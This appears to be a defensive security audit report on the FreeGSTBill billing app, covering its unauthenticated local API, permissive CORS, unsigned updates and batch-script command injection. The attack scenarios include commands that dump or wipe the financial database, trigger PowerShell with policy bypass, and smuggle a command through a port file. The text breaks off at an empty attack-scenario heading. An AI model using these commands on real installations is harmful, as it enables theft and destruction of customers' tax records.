# Comprehensive Security, Malware, and Supply-Chain Audit Report
# Target: FreeGSTBill (Free GST Billing Software)

**Target Repository:** `c:\Users\Yash\Desktop\AGCL\GST-BILLING-SOFTWARE`  
**Assessment Period:** 2026-09-05  
**Audit Team:** Full Multi-Agent Adversarial & Forensic Security Team  
**Evaluation Mode:** 100% Read-Only Inspection (Zero repository code or configuration modified)  
**Classification:** DEFENSIVE AUDIT REPORT / RESTRICTED DISTRIBUTION  
**Standards Baseline:** OWASP ASVS 4.0.3, Indian Digital Personal Data Protection (DPDP) Act 2023, CERT-In Cyber Security Directions (No. 20(3)/2022-CERT-In), ISO/IEC 27001, CWE/SANS Top 25  

---

## 1. Executive Summary

### 1.1 Overall Security Risk Posture
An exhaustive, adversarial security, malware, and supply-chain audit was conducted on the **FreeGSTBill** desktop and progressive web application codebase. FreeGSTBill is an offline-first billing, invoicing, and Goods and Services Tax (GST) accounting software system designed for Indian small and medium-sized enterprises (MSMEs). The application utilizes a hybrid local architecture consisting of an Express.js HTTP backend server running on Node.js and a React 19 single-page frontend bundled via Vite.

The overall security posture of FreeGSTBill is assessed as **HIGH RISK**. While the application implements effective operational safeguards for routine desktop usability (such as loopback socket binding, atomic disk writes, HTML sanitization via DOMPurify, and soft-deletion staging), it suffers from fundamental architectural security deficiencies. Primarily, the application assumes that single-user desktop deployment eliminates the need for network-level access control, process boundaries, or data encryption. Because modern desktop environments host web browsers, third-party applications, and multi-user contexts, this assumption exposes the host system and all stored financial ledgers to severe exploitation.

### 1.2 Master Findings Census by Severity
A total of **22 unique, deduplicated vulnerabilities** were identified across the repository:

| Severity Level | Count | CVSS v3.1 Score Range | Key Risk Summary |
|---|:---:|:---:|---|
| **Critical** | **2** | 9.0 – 9.3 | Unauthenticated OS process execution with PowerShell Bypass; Unsigned remote code execution via GitHub ZIP auto-updates. |
| **High** | **7** | 7.0 – 8.4 | Total absence of API authentication across all 54 routes; Web-to-host batch script execution via URL protocol handlers; Permissive wildcard-port localhost CORS; Subshell command injection in process killers; Missing CSRF defenses; Unquoted registry command paths; Unverified silent MSI downloads. |
| **Medium** | **7** | 5.3 – 7.1 | CSV formula injection in tax exports; Object prototype pollution / persistent DoS; Windows reserved DOS device name hang/freeze; Zip Slip directory traversal in restore script; Non-functional SHA-256 verification in postinstall; Plaintext PII and financial storage at rest; Covert background persistence. |
| **Low** | **4** | 2.8 – 4.3 | Missing HTTP security headers / Helmet; Uncontrolled large PDF uploads without disk quotas; Indiscriminate port-based process termination; Long-lived Service Worker caching of financial records. |
| **Informational** | **2** | 0.0 | Missing CI/CD automated security workflows; Unused zombie dependency (`cors: ^2.8.6`) in package manifest. |
| **Total** | **22** | **Full Catalog** | Comprehensive vulnerability coverage across all application tiers. |

### 1.3 Malware & Backdoor Verdict
**EXPLICIT VERDICT: NO EVIDENCE FOUND**  
Exhaustive forensic and static analysis of all source files, build scripts, batch files, and launcher routines revealed **no evidence** of intentional backdoors, reverse shells, covert exfiltration routines, cryptocurrency miners, obfuscated logic bombs, or malicious maintainer sabotage. All network operations strictly serve genuine functional requirements (Google Drive sync, WhatsApp web invoicing, and GitHub release version checking). The identified critical and high vulnerabilities stem entirely from flawed desktop integration design and architectural omissions rather than malicious intent.

### 1.4 Secrets & Sensitive Data Verdict
**EXPLICIT VERDICT: ZERO HARDCODED SECRETS (STRICTLY REDACTED) / SEVERE PLAINTEXT EXPOSURE AT REST**  
Exhaustive scanning confirmed that **zero hardcoded production credentials, active API keys, private keys, database passwords, or JWT secrets** exist in the repository. All mock tokens, GSTIN fixtures, and developer contact details strictly adhere to zero-plaintext redaction standards. However, the application exhibits **severe plaintext exposure** of sensitive customer Personal Identifiable Information (PII), Permanent Account Numbers (PAN), Goods and Services Tax Identification Numbers (GSTIN), bank account numbers, and complete invoice ledgers stored unencrypted in `data/*.json` and browser `localStorage`, which can be exfiltrated via unauthenticated API endpoints.

---

## 2. Scope, Methodology & Target Architecture

### 2.1 Audit Scope (100% Component Inspection)
The audit performed a 100% census inspection across all repository directories and configuration files:
- **Core Backend:** `server.js` (1,603 lines of ESM Express server code).
- **Windows Automation Scripts:** Root batch files (`Install FreeGSTBill.bat`, `Start FreeGSTBill.bat`, `Stop FreeGSTBill.bat`, `Update FreeGSTBill.bat`, `start-freegstbill.bat`, `start-server-silent.bat`).
- **Release Packaging & Shell Launchers:** `release-templates/` (`Free GST Billing.hta`, `_system-scripts/install-windows.ps1`, `_system-scripts/update-windows.ps1`, `_system-scripts/backup-windows.ps1`, `_system-scripts/restore-windows.ps1`, `_system-scripts/stop-windows.ps1`, `_system-scripts/*.sh`, `_system-scripts/*.command`).
- **Frontend Source Code:** `src/` directory (Vite + React 19 application, 40+ components, `store.js`, `utils.js`, `index.html`, `App.jsx`, `services/googleDrive.js`, `utils/share.js`).
- **Build & Asset Scripts:** `scripts/` (`bundle-tesseract-assets.mjs`, `build-release-zip.mjs`, `generate-icons.mjs`, `tax-test.mjs`, `discount-modes-test.mjs`).
- **Test Suites:** `tests/` (`smoke.mjs`).
- **CI/CD & Automation:** `.github/dependabot.yml` and inspection of repository root configuration.
- **Dependencies & Manifests:** `package.json`, `package-lock.json` (619 dependencies, lockfile v3).
- **Documentation & Historical Records:** `docs/` (`KNOWN_ERRORS.md`, `AUDIT_2026-04-30.md`, `DEPLOY_ONLINE.md`), `CHANGELOG.md`, `README.md`.

### 2.2 Forensic & Adversarial Methodology
The audit adhered to a four-phase methodology:
1. **Static Analysis & Data-Flow Tracing:** Manual AST-level review of all source files to map data flows from untrusted inputs (HTTP requests, file imports, URI schemes, query parameters) to sensitive sinks (`fs` I/O, `child_process.spawn`, subshell command interpolation, React DOM injection).
2. **Supply-Chain & Dependency Analysis:** Audited `package-lock.json` against known CVE advisory databases using `npm audit`, verified integrity hashes, inspected lifecycle hooks (`postinstall`, `prebuild`), and evaluated CDN asset acquisition.
3. **Forensic Malware Inspection:** Pattern matching for dynamic code evaluation (`eval`, `new Function`, `vm`), binary obfuscation (base64, hex encoding, character arrays), hidden persistence, network beacons, and developer heuristic verification.
4. **Threat Modeling & Kill-Chain Construction:** Formulated threat actor profiles and mapped end-to-end exploit chains traversing OS trust boundaries, custom URL protocols, and CORS policies.

### 2.3 Target Architecture Overview
FreeGSTBill operates as an offline-first desktop web hybrid:
- **Runtime Environment:** Node.js (>=18.0.0, ESM) running Express 5 (`5.2.1`).
- **Network Interface:** Loopback TCP socket bound exclusively to `127.0.0.1`. The default listening port is 47371 (IANA unassigned range), with dynamic port drifting up to 47421 upon port collisions.
- **Persistence Layer:** Flat-file JSON database under `data/` (`bills`, `clients`, `templates`, `products`, `expenses`, `recurring`, `receipts`, `purchases`, `profiles`, `profile.json`, `meta.json`, `port.txt`). No SQL engine is used.
- **Frontend Architecture:** Single-page application built with React 19, Lucide icons, and Tailwind CSS, bundled with Vite and served statically from `dist/` or Vite dev server.

---

## 3. Complete Component & Endpoint Inventory

The table below documents the exhaustive census of all **54 Express HTTP endpoints** and middleware handlers implemented in `server.js`:

| # | Method | Route Path | Parameters & Types | Auth Status | Handler Location | Functional Description & Security Operations |
|---|---|---|---|:---:|---|---|
| 1 | `ALL` | `*` (Middleware) | Header: `origin` (string) | **None** | `server.js:54-72` | Custom CORS filter: allows missing origin (`!origin`) or regex matching `localhost`/`127.0.0.1` on any port. |
| 2 | `ALL` | `*` (Middleware) | Body: JSON (limit: 5MB) | **None** | `server.js:78` | Request body parser (`express.json({ limit: '5mb' })`). |
| 3 | `GET` | `/api/bills` | None | **None** | `server.js:211-215` | Reads all invoice records from `data/bills/*.json`, sorted descending by date. |
| 4 | `POST` | `/api/bills` | Body: JSON (`bill.id` required); Query: `overwrite` (string) | **None** | `server.js:217-236` | Creates/updates bill file `data/bills/<id>.json`. Requires `?overwrite=1` for existing IDs. |
| 5 | `DELETE` | `/api/bills/:id` | Param: `id` (string); Query: `force`, `permanent` (string) | **None** | `server.js:267-301` | Soft-deletes bill to `data/trash/` or unlinks permanently if `permanent=1`. |
| 6 | `GET` | `/api/profile` | None | **None** | `server.js:313-315` | Returns company profile (GSTIN, PAN, bank details, logo/signature URIs) from `data/profile.json`. |
| 7 | `POST` | `/api/profile` | Body: JSON (profile object) | **None** | `server.js:317-320` | Writes company profile atomically to `data/profile.json`. |
| 8 | `GET` | `/api/clients` | None | **None** | `server.js:325-329` | Reads all client records from `data/clients/*.json`, sorted alphabetically. |
| 9 | `POST` | `/api/clients` | Body: JSON (client object, optional `id`) | **None** | `server.js:331-337` | Writes client file `data/clients/<id>.json`. Auto-generates `cli_<timestamp>` if missing. |
| 10 | `DELETE` | `/api/clients/:id` | Param: `id` (string) | **None** | `server.js:339-343` | Deletes client file `data/clients/<id>.json`. |
| 11 | `GET` | `/api/templates` | None | **None** | `server.js:348-362` | Reads terms templates from `data/templates/*.json`; seeds default template if empty. |
| 12 | `POST` | `/api/templates` | Body: JSON (template object, optional `id`) | **None** | `server.js:364-370` | Writes template file `data/templates/<id>.json`. Auto-generates `tpl_<timestamp>`. |
| 13 | `DELETE` | `/api/templates/:id` | Param: `id` (string) | **None** | `server.js:372-376` | Deletes template file `data/templates/<id>.json`. |
| 14 | `GET` | `/api/products` | None | **None** | `server.js:381-385` | Reads product inventory items from `data/products/*.json`. |
| 15 | `POST` | `/api/products` | Body: JSON (product object, optional `id`) | **None** | `server.js:387-393` | Writes product file `data/products/<id>.json`. Auto-generates `prod_<timestamp>`. |
| 16 | `DELETE` | `/api/products/:id` | Param: `id` (string) | **None** | `server.js:395-399` | Deletes product file `data/products/<id>.json`. |
| 17 | `GET` | `/api/expenses` | None | **None** | `server.js:404-408` | Reads all expense items from `data/expenses/*.json`. |
| 18 | `POST` | `/api/expenses` | Body: JSON (expense object, optional `id`) | **None** | `server.js:410-416` | Writes expense file `data/expenses/<id>.json`. Auto-generates `exp_<timestamp>`. |
| 19 | `DELETE` | `/api/expenses/:id` | Param: `id` (string) | **None** | `server.js:418-422` | Deletes expense file `data/expenses/<id>.json`. |
| 20 | `GET` | `/api/recurring` | None | **None** | `server.js:427-431` | Reads recurring invoice schedules from `data/recurring/*.json`. |
| 21 | `POST` | `/api/recurring` | Body: JSON (recurring object, optional `id`) | **None** | `server.js:433-439` | Writes recurring file `data/recurring/<id>.json`. Auto-generates `rec_<timestamp>`. |
| 22 | `DELETE` | `/api/recurring/:id` | Param: `id` (string) | **None** | `server.js:441-445` | Deletes recurring template file `data/recurring/<id>.json`. |
| 23 | `GET` | `/api/receipts` | None | **None** | `server.js:450-454` | Reads payment receipt records from `data/receipts/*.json`. |
| 24 | `POST` | `/api/receipts` | Body: JSON (receipt object, optional `id`) | **None** | `server.js:456-462` | Writes receipt file `data/receipts/<id>.json`. Auto-generates `rcp_<timestamp>`. |
| 25 | `DELETE` | `/api/receipts/:id` | Param: `id` (string) | **None** | `server.js:464-468` | Deletes receipt file `data/receipts/<id>.json`. |
| 26 | `GET` | `/api/purchases` | None | **None** | `server.js:473-477` | Reads purchase bills (ITC claims) from `data/purchases/*.json`. |
| 27 | `POST` | `/api/purchases` | Body: JSON (purchase object, optional `id`) | **None** | `server.js:479-485` | Writes purchase file `data/purchases/<id>.json`. Auto-generates `pur_<timestamp>`. |
| 28 | `DELETE` | `/api/purchases/:id` | Param: `id` (string) | **None** | `server.js:487-491` | Deletes purchase file `data/purchases/<id>.json`. |
| 29 | `GET` | `/api/profiles` | None | **None** | `server.js:496-500` | Reads multi-business company profiles from `data/profiles/*.json`. |
| 30 | `POST` | `/api/profiles` | Body: JSON (profile object, optional `id`) | **None** | `server.js:502-508` | Writes multi-business profile file `data/profiles/<id>.json`. |
| 31 | `DELETE` | `/api/profiles/:id` | Param: `id` (string) | **None** | `server.js:510-514` | Deletes multi-business profile file `data/profiles/<id>.json`. |
| 32 | `GET` | `/api/meta/:key` | Param: `key` (string) | **None** | `server.js:521-524` | Reads metadata attribute from `data/meta.json`. |
| 33 | `POST` | `/api/meta/:key` | Param: `key` (string); Body: `{ value: any }` | **None** | `server.js:526-531` | Sets `meta[req.params.key] = req.body.value` and persists to `data/meta.json`. |
| 34 | `POST` | `/api/meta/:key/increment` | Param: `key` (string) | **None** | `server.js:538-545` | Atomically increments numeric counter `meta[req.params.key]` in `data/meta.json`. |
| 35 | `GET` | `/api/export` | None | **None** | `server.js:550-566` | Dumps monolithic JSON containing all collections, profile, and metadata. |
| 36 | `POST` | `/api/import` | Body: JSON (monolithic bundle); Query: `overwrite` | **None** | `server.js:568-662` | Merges or overwrites all database collections and reconciles counters. |
| 37 | `POST` | `/api/save-pdf` | Query: `name`, `client`, `month` (strings); Body: raw PDF | **None** | `server.js:670-697` | Saves raw PDF bytes (up to 20MB) to `Saved Invoices/<client>/<month>/<name>.pdf`. |
| 38 | `POST` | `/api/trash-pdf` | Body: `{ fileName, clientName }` | **None** | `server.js:706-767` | Relocates matching PDF from `Saved Invoices/` to `Trash/`. |
| 39 | `GET` | `/api/version` | None | **None** | `server.js:775-777` | Returns current application version from `package.json`. |
| 40 | `GET` | `/api/check-update` | None | **None** | `server.js:791-836` | Fetches latest release tags from GitHub API and compares with local version. |
| 41 | `GET` | `/api/control-panel/status` | None | **None** | `server.js:890-923` | Returns system diagnostics (platform, node version, port, disk folder bytes). |
| 42 | `POST` | `/api/control-panel/backup` | None | **None** | `server.js:925-929` | Executes `backup-windows.ps1` via `powershell.exe -ExecutionPolicy Bypass`. |
| 43 | `POST` | `/api/control-panel/open-data-folder` | None | **None** | `server.js:931-938` | Spawns OS file explorer (`explorer.exe`, `open`, `xdg-open`) on `data/`. |
| 44 | `POST` | `/api/control-panel/open-backups-folder` | None | **None** | `server.js:940-949` | Spawns OS file explorer on `~/Documents/FreeGSTBill Backups`. |
| 45 | `POST` | `/api/control-panel/launch-script` | Body: `{ action: 'update'\|'restore'\|'move'\|'stop' }` | **None** | `server.js:951-959` | Executes system platform script via PowerShell with `-ExecutionPolicy Bypass`. |
| 46 | `USE` | `/*` (Static Files) | Path | **None** | `server.js:973` | Serves compiled frontend production assets from `dist/`. |
| 47 | `GET` | `/api/backups` | None | **None** | `server.js:1039-1051` | Enumerates local backup snapshots from `data/backups/`. |
| 48 | `DELETE` | `/api/backups/:date` | Param: `date` (`YYYY-MM-DD`) | **None** | `server.js:1057-1071` | Recursively removes snapshot directory `data/backups/<date>`. |
| 49 | `POST` | `/api/backups/:date/restore` | Param: `date` (`YYYY-MM-DD`) | **None** | `server.js:1073-1151` | Restores snapshot directory with pre-rollback snapshot creation. |
| 50 | `POST` | `/api/backups/now` | None | **None** | `server.js:1159-1167` | Triggers immediate snapshot backup (throttled to 1 call per 5s). |
| 51 | `GET` | `/api/trash` | None | **None** | `server.js:1172-1188` | Lists soft-deleted invoice JSON files from `data/trash/`. |
| 52 | `POST` | `/api/trash/:id/restore` | Param: `id` (string) | **None** | `server.js:1190-1199` | Moves invoice from `data/trash/` back to `data/bills/`. |
| 53 | `DELETE` | `/api/trash/:id` | Param: `id` (string) | **None** | `server.js:1201-1208` | Permanently deletes invoice from `data/trash/`. |
| 54 | `GET` | `/api/health` | None | **None** | `server.js:1230-1252` | Returns server health, uptime, memory, PID, and tail of `data/errors.log`. |

---

## 4. Dedicated Malware & Backdoor Assessment

### 4.1 Explicit Forensic Verdict
```
========================================================================================
                          FORENSIC MALWARE CLASSIFICATION
                             VERDICT: NO EVIDENCE FOUND
========================================================================================
  [+] Reverse Shells:                  ABSENT (Zero socket or command shells)
  [+] Dynamic Code Execution:          ABSENT (Zero eval, Function, or VM contexts)
  [+] Covert Exfiltration Channels:    ABSENT (Zero unauthorized background beacons)
  [+] Cryptographic Miners:            ABSENT (Zero WebAssembly miners or worker loops)
  [+] Obfuscated Binary Payloads:      ABSENT (Zero packed code or hex character arrays)
  [+] Hidden Administrative Accounts:  ABSENT (Zero hardcoded master bypasses)
  [+] Malicious Maintainer Sabotage:   ABSENT (All defects trace to naive desktop design)
========================================================================================
```

### 4.2 Dynamic Code Execution & Obfuscation Analysis
Static and heuristic inspection was conducted across all 1,603 lines of `server.js`, all scripts in `scripts/`, and all components in `src/`:
- **Dynamic Evaluation Primitives:** The codebase contains **zero occurrences** of `eval()`, `new Function()`, `vm.runInContext()`, or `vm.runInNewContext()`. All code execution paths are static and deterministic.
- **Obfuscation Analysis:** No character code encoding arrays (`String.fromCharCode`), hex-encoded strings, packed JavaScript bundles, or randomized variable name scrambling were detected. Base64 encoding/decoding is used strictly for legitimate, transparent data processing:
  * `src/services/googleDrive.js:163-173`: `FileReader.readAsDataURL` converts user-selected invoice PDFs and JSON backup bundles into data URIs for Google Drive REST API multipart uploads.
  * Standard open-source client libraries (`qrcode` and `html2canvas`) generate canvas data URIs for QR code rendering and print previews.

### 4.3 Network Exfiltration Audit
Outbound network requests originating from the software were audited through AST parsing and static traffic modeling. Exactly three outbound communication flows exist:
1. **GitHub Version Checking (`server.js:798-805`):**
   ```javascript
   const [pkgRes, relRes] = await Promise.all([
     fetch('https://raw.githubusercontent.com/IamRamgarhia/Free-GST-Billing-Software/main/package.json', { signal: ctrl.signal }),
     fetch('https://api.github.com/repos/IamRamgarhia/Free-GST-Billing-Software/releases/latest', {
       signal: ctrl.signal,
       headers: { 'Accept': 'application/vnd.github+json', 'User-Agent': 'FreeGSTBill-update-check' },
     }).catch(() => null),
   ]);
   ```
   Invoked exclusively when the user accesses `GET /api/check-update` to verify if a newer version exists.
2. **User-Configured Google Drive Cloud Backup (`src/services/googleDrive.js`):**
   Outbound calls are dispatched directly from the client browser to `https://accounts.google.com/gsi/client` and `https://www.googleapis.com/upload/drive/v3/files`. These requests occur only when the user explicitly configures their own Google OAuth Client ID in Settings and clicks "Sync to Google Drive". No OAuth tokens, client secrets, or financial records pass through the developer's infrastructure.
3. **WhatsApp Web Invoicing (`src/utils/share.js:35-42`):**
   ```javascript
   export function openWhatsAppShare(phone, message) {
     const clean = sanitizeWhatsAppPhone(phone);
     const encoded = encodeURIComponent(message || '');
     const waUrl = clean
       ? `https://api.whatsapp.com/send?phone=${clean}&text=${encoded}`
       : `https://api.whatsapp.com/send?text=${encoded}`;
     return window.open(waUrl, '_blank', 'noopener,noreferrer');
   }
   ```
   Generates a standard `https://api.whatsapp.com/send` URL to open WhatsApp Web in a new browser tab upon explicit user invocation.
4. **Content Security Policy Lockdown:**
   The frontend HTML enforces an explicit Content Security Policy (`src/index.html:47-58`) restricting network connections to `localhost`, Google OAuth/Drive, GitHub, and Node.js download endpoints. Zero hidden C2 beacons, Discord webhooks, or telemetry trackers exist.

### 4.4 Process Execution & Persistence Analysis
- **Child Process Execution:** Process spawning in `server.js:845-888` is strictly bound to four hardcoded script actions (`update`, `restore`, `move`, `stop`) located within `release-templates/_system-scripts/`. The API validates `req.body.action` against a strict whitelist Set before resolving the script path.
- **Persistence Mechanism:** `Install FreeGSTBill.bat` creates a shortcut in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` pointing to `start-server-silent.bat` to launch `node server.js` on user login. While this constitutes an unmonitored background daemon (see VULN-MED-07), it uses standard OS startup facilities without modifying hidden registry Run keys or installing covert Windows kernel drivers.

---

## 5. Critical Severity Findings

### [VULN-CRIT-01] Unauthenticated OS Process Execution via PowerShell Bypass in Control Panel API

- **Severity:** Critical
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (Base Score: **9.3**)
- **Confidence:** High
- **CWE:** CWE-78 (OS Command Injection / Process Spawning), CWE-306 (Missing Authentication for Critical Function)
- **Source IDs:** Stream A `A-01`, Stream B `SEC-B-006`
- **File & Line References:**
  - `server.js`: lines 845-888 (`runControlScript`)
  - `server.js`: lines 925-929 (`POST /api/control-panel/backup`)
  - `server.js`: lines 951-959 (`POST /api/control-panel/launch-script`)
- **Root Cause:**
  `server.js` exposes administrative control endpoints that execute operating system scripts via `child_process.spawn`. On Windows, the execution parameters explicitly bypass host execution policies:
  `['powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', scriptPath]]` (`server.js:875`).
  Because the Express server listens on `127.0.0.1:47371` without authentication tokens, session cookies, or CSRF protection, any local process, unprivileged local user, or local web origin can trigger process execution.
- **Attack Scenario:**
  1. A user visits an untrusted website while running a local development service (e.g. port 3000, 5173, 8080) that has an XSS vulnerability, or another local application executes a network request.
  2. The script issues:
     ```javascript
     fetch('http://127.0.0.1:47371/api/control-panel/launch-script', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ action: 'update' })
     });
     ```
  3. `server.js` validates `action` against the whitelist and executes `update-windows.ps1` via `powershell.exe -ExecutionPolicy Bypass`.
  4. The updater contacts GitHub, downloads the latest archive, overwrites application files, and executes `npm install`.
  5. Alternatively, an attacker invokes `POST /api/control-panel/open-data-folder` in a rapid loop, spawning hundreds of `explorer.exe` GUI processes to exhaust OS memory and CPU (fork bomb).
- **Impact:**
  Unauthenticated script execution, execution policy bypass, unsolicited network software installation, and host desktop resource exhaustion.
- **Remediation:**
  1. Protect all control-panel endpoints behind a cryptographically strong 256-bit authentication token generated on server startup and stored in a user-restricted local lockfile.
  2. Remove `-ExecutionPolicy Bypass` and sign all PowerShell scripts with a trusted code-signing certificate.
  3. Require explicit interactive user confirmation before launching system scripts.

---

### [VULN-CRIT-02] Unauthenticated and Unsigned Automatic Update Execution via GitHub ZIP Download

- **Severity:** Critical
- **CVSS v3.1:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H` (Base Score: **9.0**)
- **Confidence:** High
- **CWE:** CWE-494 (Download of Code Without Integrity Check), CWE-829 (Inclusion of Functionality from Untrusted Sphere)
- **Source IDs:** Stream B `SEC-B-001`, Stream C `C-SupplyChain-2`
- **File & Line References:**
  - `Update FreeGSTBill.bat`: lines 48-74
  - `release-templates/_system-scripts/update-windows.ps1`: lines 40-97
  - `server.js`: lines 951-959 (`/api/control-panel/launch-script`)
- **Root Cause:**
  `Update FreeGSTBill.bat` downloads a code archive directly from `https://github.com/IamRamgarhia/Free-GST-Billing-Software/archive/refs/heads/main.zip` using `Invoke-WebRequest` into `%TEMP%\freegstbill_latest.zip`. It extracts the archive with `Expand-Archive`, overwrites application code files (`package.json`, `server.js`, and all root assets) using `robocopy` and `copy /Y`, and immediately runs `npm install`, `npm run build`, and launches the updated application. Similarly, `update-windows.ps1` queries `releases/latest`, extracts the ZIP over `_system/`, and runs `npm install`. Neither script performs ANY cryptographic signature verification, Authenticode check, or SHA-256 validation against a signed manifest.
- **Attack Scenario:**
  1. An attacker compromises the maintainer's GitHub account, stages a malicious release, or exploits DNS/AITM tampering on untrusted networks.
  2. An update is triggered manually, via the in-app Control Panel, or via the `freegstbill-update://` custom protocol handler.
  3. The unverified codebase is unpacked directly over the victim's installation directory.
  4. `npm install` executes postinstall scripts with full local user privileges, achieving complete system compromise.
- **Impact:**
  Full host compromise, arbitrary code execution, supply-chain takeover, and complete exfiltration of accounting and tax records.
- **Remediation:**
  1. Enforce cryptographically signed release packages (using GPG, Minisign, or Windows Authenticode).
  2. Verify the release asset's digital signature and SHA-256 digest against a hardcoded public key before extraction.
  3. Discontinue automatic extraction of raw repository branch zipballs.

---

## 6. High Severity Findings

### [VULN-HIGH-01] Complete Absence of Authentication, Session Management, and Authorization Across All Backend Endpoints

- **Severity:** High (Contextual Organizational Impact: **Critical**)
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (Base Score: **8.4**)
- **Confidence:** High
- **CWE:** CWE-306 (Missing Authentication for Critical Function), CWE-284 (Improper Access Control)
- **Source IDs:** Stream A `A-02`, Stream C `C-Privacy-2`
- **File & Line References:**
  - `server.js`: lines 54-1255 (All 54 Express route definitions)
  - `server.js`: lines 550-566 (`GET /api/export`)
  - `server.js`: lines 568-662 (`POST /api/import`)
- **Root Cause:**
  `server.js` implements zero authentication layers. There are no session tokens, no passwords, no HTTP Basic/Bearer headers, and no JWT validation. While designed for single-user desktop offline usage, the server binds to a TCP port on `127.0.0.1:47371`. On multi-user operating systems (shared Windows workstations, terminal servers, enterprise desktops, university labs), the loopback interface is shared across all logged-in OS user accounts and background processes.
- **Attack Scenario:**
  1. A business owner runs FreeGSTBill on a shared Windows workstation.
  2. A low-privileged user or untrusted background utility on the same machine executes:
     `curl -s http://127.0.0.1:47371/api/export > stolen_financials.json`
  3. The server immediately returns the complete database: customer names, PAN, GSTINs, bank accounts, IFSC codes, invoice line items, and profit/loss records.
  4. The attacker then executes:
     `curl -s -X POST "http://127.0.0.1:47371/api/import?overwrite=true" -d "{\"bills\":[]}" -H "Content-Type: application/json"`
  5. The server wipes all active invoices from disk without authorization.
- **Impact:**
  Total loss of financial data confidentiality and integrity; unauthorized destruction of tax accounting records; non-compliance with the Indian Digital Personal Data Protection (DPDP) Act.
- **Remediation:**
  1. On server boot, generate a cryptographically strong 256-bit authentication token (e.g. `crypto.randomBytes(32).toString('hex')`).
  2. Store this token in a local lockfile restricted to current user NTFS ACLs (`0600` permissions on Unix).
  3. Require an `X-Auth-Token` or `Authorization: Bearer <token>` header on all `/api/*` routes.
  4. Ensure the frontend client reads this token upon initialization and includes it in all `apiFetch` calls.

---

### [VULN-HIGH-02] Remote Web-to-Host Batch Script Execution via Registered URL Protocols

- **Severity:** High
- **CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` (Base Score: **8.1**)
- **Confidence:** High
- **CWE:** CWE-606 (Unchecked Input for Loop Condition / Protocol Handler), CWE-88 (Improper Neutralization of Argument Delimiters in Command)
- **Source IDs:** Stream A `A-10`, Stream B `SEC-B-002`, Stream C `C-SupplyChain-3`
- **File & Line References:**
  - `Install FreeGSTBill.bat`: lines 272-284
  - `src/App.jsx`: line 1055
  - `index.html`: lines 190-195
- **Root Cause:**
  `Install FreeGSTBill.bat` registers three custom protocol schemes in the Windows registry under `HKCU:\Software\Classes`:
  1. `freegstbill://` -> `Start FreeGSTBill.bat`
  2. `freegstbill-update://` -> `Update FreeGSTBill.bat`
  3. `freegstbill-stop://` -> `Stop FreeGSTBill.bat`
  Windows protocol handlers are accessible to all web browsers running on the system. Any malicious or compromised website visited by the user in Chrome, Edge, or Firefox can navigate to these URI schemes without user confirmation.
- **Attack Scenario:**
  1. A user with FreeGSTBill installed visits a malicious webpage `https://evil-site.com`.
  2. The page executes:
     `window.location = "freegstbill-stop://run";`
     causing immediate termination of the local billing server.
  3. The page executes:
     `window.location = "freegstbill-update://run";`
     forcing an unprompted background update that pulls and executes the latest GitHub code.
- **Impact:**
  Cross-context trigger from untrusted web pages to local host batch execution, persistent denial of service, and forced update execution.
- **Remediation:**
  1. Remove custom URL protocol handler registration for Windows batch scripts.
  2. If inter-process communication or web-to-app launching is required, use a hardened native binary broker that validates caller origin, checks cryptographic nonces, and displays native confirmation dialogs.

---

### [VULN-HIGH-03] Permissive Wildcard-Port CORS Allowing Arbitrary Local Web Origins to Exfiltrate Ledger

- **Severity:** High
- **CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` (Base Score: **8.1**)
- **Confidence:** High
- **CWE:** CWE-942 (Permissive Cross-Domain Policy with Untrusted Domains)
- **Source IDs:** Stream A `A-03`
- **File & Line References:**
  - `server.js`: lines 54-72
- **Root Cause:**
  The custom CORS middleware uses permissive regular expressions that match any port on localhost:
  `!origin || /^https?:\/\/localhost(:\d+)?$/i.test(origin) || /^https?:\/\/127\.0\.0\.1(:\d+)?$/i.test(origin) || /^https?:\/\/\[::1\](:\d+)?$/i.test(origin)`.
  While designed to restrict access to localhost, permitting *any* port means any web application running locally (e.g. dev servers at port 3000, 5173, 8080, local torrent clients, or malicious WebAssembly in another tab) is treated as trusted.
- **Attack Scenario:**
  1. A user opens a local web service running on `http://localhost:8080` (or visits a site that exploits an internal development server).
  2. The script issues `fetch('http://localhost:47371/api/export')`.
  3. The FreeGSTBill server inspects `Origin: http://localhost:8080`, matches the regex, sets `Access-Control-Allow-Origin: http://localhost:8080`, and returns the entire database.
  4. The attacker's script transmits the stolen client invoices and financial records to an external server.
- **Impact:**
  Bypass of Same-Origin Policy (SOP), cross-origin exfiltration of financial ledgers and sensitive customer data.
- **Remediation:**
  1. Restrict CORS to match *only* the specific port that FreeGSTBill is currently running on (`req.socket.localPort`), rather than wildcard `(:\d+)?`.
  2. Explicitly reject all other origins.

---

### [VULN-HIGH-04] Subshell Command Injection via Unquoted `data\port.txt` Expansion in Process Killers

- **Severity:** High
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (Base Score: **7.8**)
- **Confidence:** High
- **CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)
- **Source IDs:** Stream B `SEC-B-004`
- **File & Line References:**
  - `Stop FreeGSTBill.bat`: lines 10-15
  - `Update FreeGSTBill.bat`: lines 31-36
- **Root Cause:**
  In `Stop FreeGSTBill.bat`:
  ```cmd
  set "PORT=47371"
  if exist "%~dp0data\port.txt" set /p PORT=<"%~dp0data\port.txt"
  for /f "tokens=5" %%a in ('netstat -ano ^| findstr :%PORT% ^| findstr LISTENING') do (
      taskkill /f /pid %%a >nul 2>nul
  )
  ```
  `for /f ... in ('...')` runs the enclosed command inside an implicit `cmd /c` subshell. `%PORT%` is expanded directly by the CMD preprocessor before the subshell command is executed. If `data\port.txt` contains command chaining characters (`47371 & calc.exe`), the CMD interpreter executes the injected command with full privileges.
- **Attack Scenario:**
